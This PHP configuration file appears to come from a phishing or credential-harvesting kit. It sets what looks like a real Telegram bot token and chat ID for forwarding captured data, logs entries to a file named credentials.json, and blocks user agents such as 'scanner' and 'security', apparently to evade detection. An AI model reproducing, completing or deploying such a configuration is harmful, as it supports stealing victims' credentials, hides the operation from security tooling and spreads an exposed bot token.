<?php
// Telegram Bot Configuration
define('TELEGRAM_BOT_TOKEN', '8045104434:AAGdSeD3w73N5MjqiF4l6XFNzSoyNaiVWdo');
define('TELEGRAM_CHAT_ID', '7410508833');

// Security Settings
define('ENABLE_LOGGING', true);
define('ENABLE_TELEGRAM', true);
define('LOG_FILE', 'logs/credentials.json');

// Email Settings (if you want email notifications)
define('SEND_EMAIL', false);
define('EMAIL_TO', 'your-email@example.com');

// IP Blacklist (optional)
$BLOCKED_IPS = array(
    // Add IPs to block
    '127.0.0.1'
);

// User Agent Blacklist (optional)
$BLOCKED_USER_AGENTS = array(
    'bot',
    'crawler',
    'spider',
    'scanner',
    'security'
);
?>